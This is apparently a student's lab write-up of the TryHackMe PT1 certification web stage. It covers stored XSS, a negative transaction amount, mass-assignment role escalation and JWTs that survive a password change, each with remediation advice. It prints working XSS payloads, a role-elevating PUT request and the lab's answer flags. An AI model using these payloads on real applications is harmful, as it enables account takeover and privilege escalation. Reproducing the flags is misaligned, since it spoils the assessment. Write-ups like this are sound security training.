# PT1 Certification - Web Stage

## Overview

This section documents my **Web Application testing stage** from the TryHackMe Junior Penetration Tester (PT1) Certification.

During the assessment, I tested a customer-facing web application and its supporting REST API. I focused on identifying vulnerabilities affecting authentication, authorization, transaction integrity, and client-side security.

I used a combination of manual testing and tools such as **Burp Suite**, **Hashcat**, and direct HTTP/API request manipulation.

I identified **four significant vulnerabilities** during the assessment:

1. Stored Cross-Site Scripting (XSS)
2. Negative Transaction Amount / Business Logic
3. Mass Assignment / Privilege Escalation
4. Insecure Authentication Mechanism — JWT Not Invalidated After Password Change

Three findings were successfully verified and produced assessment flags. The token invalidation issue was confirmed as reproducible but did not produce a flag and was submitted for partial credit.

---

## Assessment Findings

| # | Vulnerability | Severity | Status |
|---|---|---|---|
| 1 | Stored Cross-Site Scripting (XSS) | Medium | Confirmed |
| 2 | Negative Transaction Amount | Medium | Confirmed |
| 3 | Mass Assignment / Role Modification | High | Confirmed |
| 4 | JWT Token Not Invalidated After Password Change | Medium–High | Confirmed / Partial Credit |

---

# Finding 1 — Stored Cross-Site Scripting

## Vulnerability

**Stored Cross-Site Scripting (Stored XSS)**

### Affected Endpoint

```text
POST /api/v1.0/transaction
```

### Affected Parameter

```text
message
```

### Severity

**Medium**

---

## Identification

While testing the transaction functionality, I identified the `message` parameter as a user-controlled input.

I first submitted HTML to determine whether the application properly encoded the value before displaying it.

```json
{
  "account_from": "<USER_A_ACCOUNT>",
  "account_to": "<USER_A_ACCOUNT>",
  "amount": 1,
  "message": "<b>XSS_TEST</b>"
}
```

The transaction was successfully created and `XSS_TEST` was rendered in bold inside the Transaction History interface.

This indicated that the application was interpreting the supplied input as HTML instead of safely encoding it.

I then tested JavaScript execution with:

```html
<img src=x onerror=alert('XSS_TEST')>
```

After the transaction was stored and the Transaction History page was refreshed, the JavaScript executed successfully.

This confirmed that the issue was **Stored XSS**, rather than simple HTML injection.

---

## Assessment Verification

To demonstrate execution in the context of another account, I created a transaction visible to the target account using:

```html
<img src=x onerror="document.cookie='XSS=XSS'">
```

The malicious transaction was successfully stored.

I then used the assessment's XSS verification endpoint:

```text
POST /api/v1.0/xss
```

The application returned:

```json
{
  "flag": "THM{c7068ae3-1104-4c26-94c4-901e2c84035b}",
  "message": "XSS Success"
}
```

This provided definitive confirmation that the stored payload executed when viewed by the target account.

### Flag

```text
THM{c7068ae3-1104-4c26-94c4-901e2c84035b}
```

---

## Attack Flow

```text
Attacker-Controlled Input
        ↓
POST /api/v1.0/transaction
        ↓
message parameter accepted
        ↓
Malicious content stored
        ↓
Transaction becomes visible to target
        ↓
Browser renders stored content
        ↓
JavaScript executes
        ↓
XSS verification
        ↓
FLAG
```

---

## Impact

Successful exploitation allowed JavaScript execution in the context of the affected web application.

Potential impact included:

- Execution of attacker-controlled JavaScript
- Manipulation of the application's interface
- Phishing or UI redirection
- Performing actions through a victim's authenticated session, depending on application controls

I specifically confirmed JavaScript execution in the target account's context. I did not attempt to steal real credentials or authentication tokens.

---

## Root Cause

The application did not sufficiently encode or sanitize user-controlled transaction messages before rendering them.

The application effectively treated untrusted transaction data as executable HTML.

---

## Remediation

- Apply context-aware output encoding.
- Treat transaction messages as untrusted text.
- Avoid unsafe HTML rendering where it is not required.
- If HTML is required, use a properly configured allowlist-based sanitizer.
- Implement a restrictive Content Security Policy (CSP).

---

# Finding 2 — Negative Transaction Amount

## Vulnerability

**Improper Input Validation / Business Logic Vulnerability**

### Affected Endpoint

```text
POST /api/v1.0/transaction
```

### Affected Parameter

```text
amount
```

### Severity

**Medium**

---

## Identification

I tested the transaction functionality for improper input validation and business logic issues.

I supplied a negative value for the transaction amount:

```json
{
  "account_from": "38f36571-0f62-405a-b64e-0194f6ad0b21",
  "account_to": "cbfe316e-6e93-406f-98ae-24fc31b1003e",
  "amount": -1,
  "message": "NEGATIVE_TEST"
}
```

The application accepted the request and processed the transaction instead of rejecting the invalid amount.

The server returned the transaction details containing:

```json
{
  "amount": -1,
  "message": "NEGATIVE_TEST"
}
```

The response also contained the assessment flag:

```text
THM{b4e3796e-88e2-4f4a-8758-f442381cf2bc}
```

### Flag

```text
THM{b4e3796e-88e2-4f4a-8758-f442381cf2bc}
```

---

## Evidence

The application returned:

```json
{
  "details": {
    "account_from": "38f36571-0f62-405a-b64e-0194f6ad0b21",
    "account_to": "cbfe316e-6e93-406f-98ae-24fc31b1003e",
    "amount": -1,
    "date": "Tue, 08 Sep 2026 16:28:29 GMT",
    "message": "NEGATIVE_TEST",
    "transactionNumber": "192834ef-ec72-42b5-8b88-aefd4ebb17bc"
  },
  "flag": "THM{b4e3796e-88e2-4f4a-8758-f442381cf2bc}",
  "message": "Transaction performed"
}
```

This confirmed that the server accepted and recorded a transaction containing a negative monetary amount.

---

## Impact

An authenticated attacker could submit transactions containing invalid negative monetary values.

This violates the expected business rule that transaction amounts should be positive.

The assessment confirmed that the invalid transaction was successfully processed.

I did **not** independently demonstrate direct financial gain or balance manipulation, so I would not claim that impact without additional evidence.

---

## Root Cause

The backend did not perform sufficient server-side validation of the `amount` parameter before passing it to the transaction-processing logic.

---

## Remediation

The server should enforce:

```text
amount > 0
```

Zero and negative values should be rejected before any transaction is processed or stored.

Validation should be performed server-side regardless of frontend restrictions.

Automated tests should also cover:

- Negative values
- Zero
- Malformed values
- Excessively large values
- Other invalid transaction amounts

---

# Finding 3 — Mass Assignment / Privilege Escalation

## Vulnerability

**Mass Assignment / Broken Access Control — Unauthorized Role Modification**

### Affected Endpoint

```text
PUT /api/v1.0/user
```

### Affected Parameter

```text
role
```

### Severity

**High**

---

## Identification

I tested the user update functionality for fields that should not normally be controlled by an ordinary authenticated user.

The user's JWT contained:

```json
{
  "username": "<USER>",
  "role": 0,
  "exp": "<EXPIRATION>"
}
```

I then attempted to modify the `role` attribute directly through the user update endpoint.

The request contained:

```http
PUT /api/v1.0/user HTTP/1.1
Content-Type: application/json
Authorization: Bearer <JWT_A>
```

```json
{
  "role": 1
}
```

The application accepted the request and returned:

```http
HTTP/1.1 200 OK
```

with:

```json
{
  "flag": "THM{9dd2fb78-2183-4618-848b-f7c9a4f0277e}",
  "message": "User updated"
}
```

This confirmed that an unprivileged user could manipulate a security-sensitive authorization attribute.

### Flag

```text
THM{9dd2fb78-2183-4618-848b-f7c9a4f0277e}
```

---

## Attack Flow

```text
Normal Authenticated User
        ↓
PUT /api/v1.0/user
        ↓
Client supplies "role"
        ↓
Backend accepts role modification
        ↓
User role is elevated
        ↓
Privilege Escalation
        ↓
FLAG
```

---

## Impact

An ordinary authenticated user could manipulate a security-sensitive authorization attribute.

If `role: 1` represents a privileged or administrative role, exploitation can result in:

- Unauthorized access to privileged functionality
- Administrative privilege escalation
- Modification of protected resources
- Authorization bypass
- Increased impact from other vulnerabilities

---

## Root Cause

The root cause was **mass assignment of security-sensitive user attributes**.

The backend accepted client-controlled fields during user updates without sufficiently restricting which properties an ordinary user was allowed to modify.

The `role` attribute should not have been writable through a normal self-service endpoint.

---

## Remediation

The application should:

- Use an explicit allowlist of fields that normal users can modify.
- Completely exclude authorization-related attributes such as `role`.
- Implement role changes through a dedicated privileged administrative endpoint.
- Enforce authorization checks server-side.
- Never rely on frontend restrictions to prevent users from submitting restricted fields.
- Add automated tests verifying that unprivileged users cannot modify their own role.

A normal user update model should contain only fields such as:

```json
{
  "username": "<USERNAME>",
  "email": "<EMAIL>"
}
```

rather than accepting arbitrary user object properties.

---

# Finding 4 — JWT Token Not Invalidated After Password Change

## Vulnerability

**Insecure Authentication Mechanism — Session/Token Not Invalidated on Credential Change**

### Affected Endpoint

```text
PUT /api/v1.0/user
```

### Protected Endpoints Tested

```text
GET /api/v1.0/user
POST /api/v1.0/transaction
```

### Severity

**Medium–High**

### Assessment Status

**Confirmed — Partial Credit**

No flag was obtained for this finding.

---

## Identification

I wanted to test whether changing a user's password would invalidate previously issued authentication tokens.

I authenticated as a test user and captured the JWT issued during login.

I then changed the account password through:

```http
PUT /api/v1.0/user
```

with:

```json
{
  "password": "NewPassword123!"
}
```

The server returned:

```json
{
  "message": "User updated"
}
```

I confirmed that the password change itself had worked by attempting to authenticate using the old password.

The old password was rejected:

```http
401 Unauthorized
```

This demonstrated that the password update was successful.

---

## Reusing the Old JWT

The important part was what happened to the JWT issued **before** the password change.

I reused the original token against:

```http
GET /api/v1.0/user
```

The server returned:

```text
200 OK
```

and provided the full profile data.

The old token remained valid despite the password having been changed.

I then tested whether the stale token still had write capabilities.

I submitted:

```http
POST /api/v1.0/transaction
Authorization: Bearer <old_token>
```

with:

```json
{
  "account_from": "...",
  "account_to": "...",
  "amount": 1,
  "message": "OLD_TOKEN_STILL_WORKS_AFTER_PASSWORD_CHANGE"
}
```

The transaction was successfully created:

```text
200 OK
Transaction performed
```

This confirmed that the old JWT remained fully functional for both read and write operations.

---

## Reproduction

The complete test flow was:

```text
Authenticate
    ↓
Receive JWT
    ↓
Change Password
    ↓
Old Password Rejected
    ↓
Reuse Original JWT
    ↓
GET /api/v1.0/user
    ↓
200 OK
    ↓
POST /api/v1.0/transaction
    ↓
200 OK
```

---

## Evidence

The old token remained valid after the password change.

A transaction was successfully created using the stale token:

```text
transactionNumber:
c1b675d8-e977-403f-909b-f09f862f47b7
```

The old password was correctly rejected at login, proving that the vulnerability was specifically related to the token lifecycle rather than the password update itself.

---

## Root Cause

The backend used stateless JWT authentication without a mechanism for invalidating previously issued tokens when credentials changed.

There was no server-side session/token revocation mechanism or token versioning tied to password changes.

As a result, a previously issued JWT remained valid until its natural expiration time.

---

## Impact

If an attacker obtains a valid JWT through another vulnerability, such as Stored XSS, session leakage, or access to a shared/lost device, changing the account password would not immediately remove the attacker's access.

The attacker could retain:

- Read access
- Write access
- Transaction capabilities
- Access to protected endpoints

until the token naturally expired.

This makes the vulnerability particularly important when combined with a token theft vulnerability.

---

## Remediation

One possible approach is to maintain a per-user token version or credential-change timestamp.

For example:

```text
User
 ├── password
 └── token_version
```

The token can contain the current version:

```json
{
  "username": "<USER>",
  "token_version": 5
}
```

When the password changes, the server increments the stored version:

```text
token_version = 6
```

The backend then rejects tokens containing the previous version.

Another approach is maintaining a server-side JWT revocation mechanism using the token's `jti`.

Additional recommendations:

- Use short-lived access tokens.
- Use refresh tokens with server-side revocation.
- Invalidate tokens after password changes.
- Ensure logout performs actual server-side invalidation.
- Do not rely solely on removing JWTs from browser storage.

---

# Web Stage Attack Methodology

My overall approach during the Web stage was to test the application's trust boundaries rather than only looking for obvious payload-based vulnerabilities.

I focused on four major areas:

```text
Authentication
      ↓
Authorization
      ↓
Input Validation
      ↓
Session / Token Security
```

This led to findings across several different security categories.

---

## What I Learned

The Web stage reinforced several important penetration testing concepts.

### 1. Test Every User-Controlled Parameter

The `message` parameter looked like normal transaction data, but testing how it was rendered exposed Stored XSS.

The important lesson was:

```text
Input Field
    ↓
Where is it stored?
    ↓
Where is it rendered?
    ↓
Is it encoded?
    ↓
Can the browser interpret it as code?
```

---

### 2. Do Not Trust Client-Controlled Authorization Data

The `role` parameter was not something a normal user should have been able to control.

Testing additional fields beyond the obvious username/email fields exposed the Mass Assignment vulnerability.

This reinforced the importance of testing:

```text
Can I modify fields that should belong to an administrator?
```

rather than only testing the intended functionality.

---

### 3. Business Logic Requires Manual Testing

Traditional payload testing is not always necessary to find a vulnerability.

In the transaction endpoint, simply testing:

```json
{
  "amount": -1
}
```

was enough to identify an invalid business rule being accepted by the backend.

This showed me that penetration testing is also about asking:

> "What should this application allow, and what happens if I violate that rule?"

---

### 4. Authentication Does Not End at Login

The JWT issue showed that authentication security also includes the entire token lifecycle.

A password change should have security consequences for previously issued sessions.

The test therefore became:

```text
Login
  ↓
Receive Token
  ↓
Change Password
  ↓
Reuse Old Token
```

This is a simple but important authentication test that can reveal weaknesses which are not visible during normal login testing.

---

# Final Web Stage Summary

I identified four confirmed security issues:

```text
1. Stored XSS
   ↓
   JavaScript execution in target account context

2. Negative Transaction Amount
   ↓
   Invalid business logic accepted by backend

3. Mass Assignment
   ↓
   Unauthorized role modification / privilege escalation

4. JWT Token Invalidation Failure
   ↓
   Stale authentication token remains valid after password change
```

Three findings produced assessment flags:

```text
THM{c7068ae3-1104-4c26-94c4-901e2c84035b}

THM{b4e3796e-88e2-4f4a-8758-f442381cf2bc}

THM{9dd2fb78-2183-4618-848b-f7c9a4f0277e}
```

The token invalidation vulnerability was confirmed and reproducible but did not produce a flag, so it was submitted for partial credit.

The biggest takeaway from this stage was that effective web penetration testing is not just about finding known vulnerability patterns. It is about understanding how the application handles **input, authorization, state, transactions, and trust boundaries**, then deliberately testing whether those assumptions can be violated.